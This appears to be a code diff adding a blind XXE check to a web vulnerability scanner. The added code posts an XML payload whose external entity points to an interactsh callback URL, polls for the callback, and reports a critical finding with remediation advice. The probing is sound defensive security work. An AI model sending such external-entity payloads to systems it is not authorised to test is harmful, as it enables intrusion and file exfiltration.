@@ -1,4 +1,5 @@
 import { ScanContext, ScanFinding, ctxFetch } from "./types";
+import { createOastClient } from "./oast";
 
 const XXE_PROBE = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE xxetest [
@@ -155,6 +156,70 @@ export async function runXxeCheck(ctx: ScanContext): Promise<ScanFinding[]> {
         scanner_family: "web",
         confidence: 0.95,
       });
+    }
+  }
+
+  // ── Blind XXE via OOB OAST callback ─────────────────────────────────────────
+  // For endpoints that parse XML but don't reflect content in the response,
+  // send a payload with an external entity pointing to the interactsh OOB URL.
+  // If the callback fires, the XML parser evaluated the external entity → confirmed.
+  if (profile !== "quick") {
+    const oast = await createOastClient();
+    if (oast) {
+      emit({ type: "log", message: "Blind XXE OOB probe enabled (interactsh connected)" });
+      for (const endpoint of endpoints.slice(0, 5)) {
+        if (ctx.abortSignal?.aborted) break;
+        const tag = `xxe-${endpoint.replace(/[^a-z0-9]/gi, "").slice(-12).toLowerCase()}`;
+        const oobUrl = oast.allocate(tag);
+
+        const blindXxeProbe = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxetest [
+  <!ENTITY % oobext SYSTEM "${oobUrl}">
+  %oobext;
+]>
+<root><data>xxetest</data></root>`;
+
+        const blindRes = await ctxFetch(ctx, endpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/xml", Accept: "application/xml, text/xml, */*" },
+          body: blindXxeProbe,
+        });
+        if (!blindRes) continue;
+        await blindRes.text().catch(() => "");
+
+        // Poll for OOB callback — XML parser must fetch the external DTD URL
+        const fired = await oast.poll(tag, 6000);
+        if (fired) {
+          findings.push({
+            title: "Blind XXE Injection — Out-of-Band Callback Confirmed",
+            category: "XXE",
+            severity: "critical",
+            endpoint,
+            description: `The endpoint processed an XML payload containing a reference to an external DTD at ${oobUrl}. An out-of-band DNS/HTTP callback was received, confirming the XML parser evaluates external entities. Even without inline content disclosure, an attacker can exfiltrate file contents via OOB techniques (DNS exfiltration of file data).`,
+            evidence: [
+              `POST ${endpoint}`,
+              `Content-Type: application/xml`,
+              `Payload contained: <!ENTITY % oobext SYSTEM "${oobUrl}">`,
+              `OOB callback received at ${oobUrl}: YES`,
+              `HTTP ${blindRes.status}`,
+              ``,
+              `This is blind XXE — no data in the response, but the parser made an outbound connection.`,
+              `File exfiltration is possible via parameter entities + OOB data channel.`,
+            ].join("\n"),
+            recommended_fix: "Disable external entity and DTD processing in your XML parser. In Java: setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). Block outbound DNS/HTTP from the app server. Use a safe XML library (defusedxml in Python, OWASP Java Encoder).",
+            cvss_score: 9.8,
+            cwe_id: "CWE-611",
+            scanner_name: "Bug-Finder/XXE",
+            scanner_family: "web",
+            confidence: 0.97,
+          });
+          emit({ type: "log", message: `  [BLIND XXE CONFIRMED via OOB] ${endpoint} → ${oobUrl}` });
+        } else {
+          emit({ type: "log", message: `  Blind XXE probe at ${endpoint} — no callback (parser did not evaluate external entity)` });
+        }
+      }
+    } else {
+      emit({ type: "log", message: "Blind XXE OOB skipped — INTERACTSH_URL not configured" });
     }
   }
 
